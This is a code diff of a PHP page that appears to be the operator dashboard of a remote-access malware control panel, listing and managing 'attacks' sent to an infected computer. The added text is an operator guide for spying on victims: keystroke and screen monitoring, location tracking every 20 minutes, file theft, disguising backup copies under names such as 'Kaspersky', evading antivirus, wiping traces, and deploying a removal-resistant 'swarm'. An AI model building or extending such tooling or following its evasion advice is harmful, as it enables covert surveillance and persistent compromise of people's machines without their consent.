@@ -3,49 +3,57 @@
 /** @noinspection PhpUnusedParameterInspection */
 
 use Kelvinho\Virus\Attack\AttackBase;
+use Kelvinho\Virus\Attack\AttackFactory;
 use Kelvinho\Virus\Attack\PackageRegistrar;
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\HtmlTemplate;
 use Kelvinho\Virus\Singleton\Timezone;
+use Kelvinho\Virus\User\User;
 use function Kelvinho\Virus\filter;
 use function Kelvinho\Virus\formattedHash;
 use function Kelvinho\Virus\formattedTime;
 use function Kelvinho\Virus\initializeArray;
 use function Kelvinho\Virus\map;
 
+/** @var PackageRegistrar $packageRegistrar */
+
 /**
- * Returns a table element with all you need to display
+ * Displays a table of viruses.
  *
- * @param array $attacks Array of attack ids
- * @param array $labels Array of labels used for the header
- * @param callable $contents Callable which upon consumption of an attack id will return an array containing the fields
- * @param null $extraData
- * @return false|string
+ * @param array $attack_ids A list of attack_ids
+ * @param array $visibleFields An array containing the columns you want to display. Example would be [0, 1, 2, 4]
+ * @param AttackFactory $attackFactory
+ * @param User $user
+ * @param PackageRegistrar $packageRegistrar
  */
-function displayTable(array $attacks, array $labels, callable $contents, $extraData = null) {
-    ob_start();
-    if (count($attacks) === 0) { ?>
+function displayTable(array $attack_ids, array $visibleFields, AttackFactory $attackFactory, User $user, PackageRegistrar $packageRegistrar) {
+    if (count($attack_ids) === 0) { ?>
         <p>(No attacks)</p>
     <?php } else { ?>
         <div style="overflow: auto;">
             <table>
-                <tr>
-                    <?php map($labels, function ($label) { ?>
-                        <th><?php echo $label; ?></th>
-                    <?php }); ?>
+                <tr><?php
+                    echo in_array(0, $visibleFields) ? "<th>Name</th>" : "";
+                    echo in_array(1, $visibleFields) ? "<th>Package</th>" : "";
+                    echo in_array(2, $visibleFields) ? "<th>Hash/id</th>" : "";
+                    echo in_array(3, $visibleFields) ? "<th>Executed time</th>" : "";
+                    echo in_array(4, $visibleFields) ? "<th></th>" : ""; ?>
                 </tr>
-                <?php
-                map($attacks, function ($attack_id, $index, $contents) { ?>
-                    <tr style="cursor: pointer;">
-                        <?php map($contents[0]($attack_id, $contents[1]), function ($content) { ?>
-                            <td><?php echo $content; ?></td>
-                        <?php }); ?>
-                    </tr>
-                <?php }, [$contents, $extraData]); ?>
+                <?php foreach ($attack_ids as $attack_id) {
+                    $attack = $attackFactory->get($attack_id);
+                    $onclick = "onclick = \"redirect('$attack_id')\"";
+                    $timezone = $user->getTimezone();
+                    echo "<tr style=\"cursor: pointer;\">";
+                    echo in_array(0, $visibleFields) ? "<td><a $onclick>" . $attack->getName() . "</a></td>" : "";
+                    echo in_array(1, $visibleFields) ? "<td><a $onclick>" . $packageRegistrar->getDisplayName($attack->getPackageDbName()) . "</a></td>" : "";
+                    echo in_array(2, $visibleFields) ? "<td><a $onclick>" . formattedHash($attack->getAttackId()) . "</a></td>" : "";
+                    echo in_array(3, $visibleFields) ? "<td><a $onclick>" . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a></td>" : "";
+                    echo in_array(4, $visibleFields) ? "<td><a onclick = \"deleteAttack('" . $attack->getAttackId() . "')\">Delete</a></td>" : "";
+                    echo "</tr>";
+                } ?>
             </table>
         </div>
     <?php }
-    return ob_get_clean();
 }
 
 if (!$session->has("virus_id")) Header::redirectToHome();
@@ -100,25 +108,24 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 </head>
 <body>
 <h1><a href="<?php echo DOMAIN_DASHBOARD; ?>">Virus info</a></h1>
-<label for="name">
-    Name
-    <input id="name" class="w3-input" type="text" value="<?php echo $virus->getName(); ?>">
-</label>
-<br>
-<label>
-    Hash/id
-    <input class="w3-input" type="text" disabled value="<?php echo $virus_id; ?>">
-</label>
-<br>
-<label>
-    Last ping
-    <input class="w3-input" type="text" disabled
-           value="<?php echo formattedTime($virus->getLastPing() + Timezone::getUnixOffset($user->getTimezone())) . " UTC " . $user->getTimezone() . " (Unix timestamp: " . $virus->getLastPing() . ")"; ?>">
-</label>
+<div class="w3-row">
+    <div class="w3-col l4 m4 s6" style="padding-right: 8px;">
+        <label for="name">Name</label>
+        <input id="name" class="w3-input" type="text" value="<?php echo $virus->getName(); ?>">
+    </div>
+    <div class="w3-col l4 m4 w3-hide-small" style="padding-right: 8px;">
+        <label for="hash">Hash/id</label>
+        <input id="hash" class="w3-input" type="text" disabled value="<?php echo $virus_id; ?>">
+    </div>
+    <div class="w3-col l4 m4 s6">
+        <label for="lastPing">Last ping</label>
+        <input id="lastPing" class="w3-input" type="text" disabled
+               value="<?php echo formattedTime($virus->getLastPing() + Timezone::getUnixOffset($user->getTimezone())) . " UTC " . $user->getTimezone() . " (Unix timestamp: " . $virus->getLastPing() . ")"; ?>">
+    </div>
+</div>
 <br>
 <label for="profile">Profile</label>
-<textarea id="profile" rows="12" cols="80" class="w3-input"
-          style="resize: vertical;"><?php echo $virus->getProfile(); ?></textarea>
+<textarea id="profile" cols="80" class="w3-input"><?php echo $virus->getProfile(); ?></textarea>
 <br>
 <div class="w3-button w3-red" onclick="updateVirus()">Update</div>
 <h1>Activity</h1>
@@ -141,88 +148,99 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <div class="w3-dropdown-hover w3-light-grey" style="margin-right: 15px;">
     <button id="attackPackage" class="w3-button">Choose attack package</button>
     <div class="w3-dropdown-content w3-bar-block w3-border">
-        <?php map(PackageRegistrar::getPackages(), function ($package) { ?>
+        <?php map($packageRegistrar->getPackages(), function ($package) use ($packageRegistrar) { ?>
             <a onclick="changePackage(<?php echo "'$package'"; ?>)"
-               class="w3-bar-item w3-button"><?php echo PackageRegistrar::getDisplayName($package); ?></a>
+               class="w3-bar-item w3-button"><?php echo $packageRegistrar->getDisplayName($package); ?></a>
         <?php }); ?>
     </div>
 </div>
 <div class="w3-button w3-red" onclick="continueAttack()">Continue</div>
-<?php map(PackageRegistrar::getPackages(), function ($dbName) { ?>
+<?php map($packageRegistrar->getPackages(), function ($dbName) use ($packageRegistrar) { ?>
     <p id="packageDescription-<?php echo $dbName; ?>" class="packageDescriptions">Package
-        description: <?php echo PackageRegistrar::getDescription($dbName); ?></p>
+        description: <?php echo $packageRegistrar->getDescription($dbName); ?></p>
 <?php }); ?>
 <div id="message" style="color: red;"></div>
-<h2>Dormant attacks</h2>
-<p>These are attacks that are not yet executed, and are not sent to the virus to execute. It just kinda hangs around
-    here until you want to attack.</p>
-<?php echo displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
-    $attack = $attackFactory->get($attack_id);
-    $onclick = "onclick = \"redirect('$attack_id')\"";
-    return ["<a $onclick>" . $attack->getName() . "</a>",
-        "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
-        "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
-        "<a onclick = \"deleteAttack('" . $attack->getAttackId() . "', '" . $attack->getVirusId() . "')\">Delete</a>"];
-}); ?>
-<h2>Deployed attacks</h2>
+<h2>Background attacks</h2>
+<h3>Offline</h3>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4], $attackFactory, $user, $packageRegistrar); ?>
+<h3>Online</h3>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4], $attackFactory, $user, $packageRegistrar); ?>
+<h2>One time attacks</h2>
+<h3>Dormant attacks</h3>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4], $attackFactory, $user, $packageRegistrar); ?>
+<h3>Deployed attacks</h3>
 <p>These are attacks that was sent to the virus, but the application hasn't heard a response from it yet. It could
     be that the virus hasn't noticed it yet, or it is executing and it's taking a long time. Or right when the virus
     is downloading the attacks, the internet is dropped and the payload doesn't get downloaded. If a payload stays
     here for more than an hour then this is likely the case. Then you can delete the attacks and start a new one all
     over again.</p>
-<?php echo displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED), ["Name", "Package", "Hash/id", ""], function ($attack_id) use ($attackFactory) {
-    $attack = $attackFactory->get($attack_id);
-    $onclick = "onclick = \"redirect('$attack_id')\"";
-    return ["<a $onclick>" . $attack->getName() . "</a>",
-        "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
-        "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
-        "<a onclick = \"deleteAttack('" . $attack->getAttackId() . "', '" . $attack->getVirusId() . "')\">Delete</a>"];
-}); ?>
-<h2>Executed attacks</h2>
-<p>These are attacks that are executed, and the virus has sent back results.</p>
-<?php echo displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED), ["Name", "Package", "Hash/id", "Executed time", ""], function ($attack_id, $timezone) use ($attackFactory) {
-    $attack = $attackFactory->get($attack_id);
-    $onclick = "onclick = \"redirect('$attack_id')\"";
-    return ["<a $onclick>" . $attack->getName() . "</a>",
-        "<a $onclick>" . PackageRegistrar::getDisplayName($attack->getPackageDbName()) . "</a>",
-        "<a $onclick>" . formattedHash($attack->getAttackId()) . "</a>",
-        "<a $onclick>" . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</a>",
-        "<a onclick = \"deleteAttack('" . $attack->getAttackId() . "', '" . $attack->getVirusId() . "')\">Delete</a>"];
-}, $user->getTimezone()); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4], $attackFactory, $user, $packageRegistrar); ?>
+<h3>Executed attacks</h3>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4], $attackFactory, $user, $packageRegistrar); ?>
 <h2>How to choose?</h2>
 <p>Oh hey, you're the new guy again. Don't know what attack packages to choose from? No worries, here is a quick
     guide.</p>
-<p>When the virus is newly installed, you may want to use these packages:</p>
+<h3>Attack types</h3>
+<ul>
+    <li><b>One time</b>: These are attacks that run once, they report back, and you view the results. Pretty
+        straightforward
+    </li>
+    <li><b>Session</b>: These are attacks that run for a short period of time (~5 to 30 minutes), giving you results in
+        realtime, and once that period of time is over, it behaves just like a one time attack. You can view the
+        results, you can delete them, and so on. These can be things like, monitor their screen every 5 seconds and
+        streaming back. Don't expect this to be smooth like Skype or TeamViewer, because the environment the virus is in
+        is quite hostile and thus it must not consume a lot of CPU, or else it will be detected. There can be other
+        things too, like monitoring what keys do they press.
+    </li>
+    <li><b>Background</b>: These are attacks that can run indefinitely if you choose to. Old data will be deleted, new
+        data will keep streaming in and you can decide what data to keep. These can be things like monitoring their
+        drives (know if they have plugged in a USB or something), or monitoring their screen every hour or so. Then
+        there are things like monitoring what programs they are running, and kill them if you so desire. However, it
+        might not be a great idea to enable all background attacks, because this will likely consume lots of resources
+        and the chance of being detected is much higher.
+    </li>
+</ul>
+<h3>Starting up</h3>
+<p>When the virus is newly installed, you will want to test out if the virus gets installed properly. These packages are
+    simple, can't go wrong, and mostly just gather system information:</p>
 <ul>
     <li>CollectEnv</li>
     <li>ScanPartitions</li>
     <li>SystemInfo</li>
 </ul>
 <p>These packages don't need any configuring to do. You can just create a new attack, deploy it and receive the
-    results back. When you get the hang of what is available on the target computer, you can use <b>ExploreDir</b>
+    results back.</p>
+<h3>Getting into the action</h3>
+<p>When you get the hang of what is available on the target computer, you can use <b>ExploreDir</b>
     to explore what files and folders are there on the host computer, then use <b>CollectFile</b> to collect any
     files that pique your interest.</p>
 <p>The virus itself is pretty stealthy, but if for whatever reason that you need to self destruct the virus
     completely, leaving no traces behind, you can use the <b>SelfDestruct</b> package. Be warned that once you have
     done this, there is absolutely no way of recovering it, even I can't recover it and you pretty much have to
-    have access to their computer again or talk really sweet to them and whatnot.</p>
+    have access to their computer again or talk really sweet to them and whatnot. Then there's the <b>Power</b> package,
+    which can let you shutdown or restart the computer at will, <b>NewVirus</b> will let you install multiple backup
+    viruses at any location you would like. I would suggest you name the directory of the virus something that sounds
+    legitimate, like "Calculator", "ECommerce", and "Kaspersky". <b>Screenshot</b> will let you take a screenshot.
+    Please note that this package is the most easily detected part of the entire virus, so proceed with caution, and
+    stop immediately if you see antivirus software popping up on the target machine.</p>
+<p>At this time, you may want to use some background attacks, like <b>MonitorLocation</b> which will get their location
+    every 20 minutes, and have results last up to a day. You can of course, save interesting places to view later, which
+    won't go away.</p>
+<h3>Getting into the weeds</h3>
 <p>If you are an advanced user. That means, you know your stuff, you know specifically how the windows command
-    line work, you know about its permission schemes, you know how the boot up process works, etc, then these are
-    the rest of the tools to help you:</p>
-<ul>
-    <li>CheckPermission</li>
-    <li>ExecuteScript</li>
-    <li>Rebase</li>
-</ul>
-<p>Of course, everything here can be done via the ExecuteScript package alone, but using this is very much
-    discouraged. I have lost so many viruses in the past prior to this update because of some stupid untested code
-    that I have written, and the virus decides to just stay silent forever. If you were to use this for some complex
-    payload then I suggest reading over the entire source code (<a href="<?php echo GITHUB_PAGE; ?>"
-                                                                   style="color: blue;">github link</a>)
-    of this tool to know how it works. Once you have understood it, I suggest you stick with the virus's
-    representation,
-    to make sure the other packages work nicely as well.</p>
-<p>Also note that some packages are "easy", others are "advanced". If a package is easy, that means that it is
+    line work, you know about its permission schemes, you know how the boot up process works, etc, then try out <b>ExecuteScript</b>.
+    You can execute a random script that you desire, and you can host extra resources just for the attack so installing
+    new scripts are easier than ever. Please note that because you can make mistakes, consider using other packages if
+    it fits your goal right away, because running custom, untested code can make the virus unstable and thus, you may
+    lose it. I highly suggest going to the <a href="<?php echo GITHUB_PAGE; ?>" style="color: blue;">source code</a>,
+    understand how the virus actually works before writing any scripts. To go along side with that, there's the <b>CheckPermission</b>
+    package, which will check whether a directory is writable by the virus or not. Finally, there's the
+    <b>ActivateSwarm</b> package, which will install a virus swarm that will look out for each other, and can fight back
+    when the user attempts to delete or make it stop running. This also means you dont have much control over the
+    swarm's architecture itself and can be a negative point. Also right now, I have not exhaustively test out everything
+    that can go wrong with it, so please spin up a virtual machine and run this, because again, you will not have
+    control over it except for sending payloads.</p>
+<p>Note that some packages are "easy", others are "advanced". If a package is easy, that means that it is
     fairly difficult to screw something up, and it's pretty easy to just execute it without thinking of its
     consequences. If it is not, that means that it is easy to screw things up, and you might accidentally remove the
     virus from existence, or you have to know more about what you are planning to do to understand how to deploy it
@@ -274,8 +292,8 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 
     gui.packageDescriptions.css("display", "none");
 
-    const packageNames = {<?php echo join(", ", map(PackageRegistrar::getPackages(), function ($dbName) {
-            return "\"$dbName\": \"" . PackageRegistrar::getDisplayName($dbName) . "\"";
+    const packageNames = {<?php echo join(", ", map($packageRegistrar->getPackages(), function ($dbName) use ($packageRegistrar) {
+            return "\"$dbName\": \"" . $packageRegistrar->getDisplayName($dbName) . "\"";
         })) ?>};
 
     function changePackage(packageDbName) {
@@ -317,14 +335,10 @@ $user = $userFactory->get($session->get("user_handle")); ?>
         });
     }
 
-    function deleteAttack(attack_id, virus_id) {
+    function deleteAttack(attack_id) {
         $.ajax({
-            url: "<?php echo DOMAIN_CONTROLLER; ?>/deleteAttack",
+            url: "<?php echo DOMAIN; ?>/vrs/<?php echo $virus->getVirusId(); ?>/aks/" + attack_id + "/ctrls/delete",
             type: "POST",
-            data: {
-                attack_id: attack_id,
-                virus_id: virus_id
-            },
             success: function () {
                 window.location = "<?php echo DOMAIN_VIRUS_INFO; ?>"
             }
@@ -571,5 +585,14 @@ $user = $userFactory->get($session->get("user_handle")); ?>
             }
         }
     });
+
+    // make the #profile textarea auto adjust the height
+    $('#profile').each(function () {
+        this.setAttribute('style', 'height:' + (this.scrollHeight) + 'px;overflow-y:hidden;resize:none;');
+    }).on('input', function () {
+        this.style.height = 'auto';
+        this.style.height = (this.scrollHeight) + 'px';
+    });
+
 </script>
 </html>
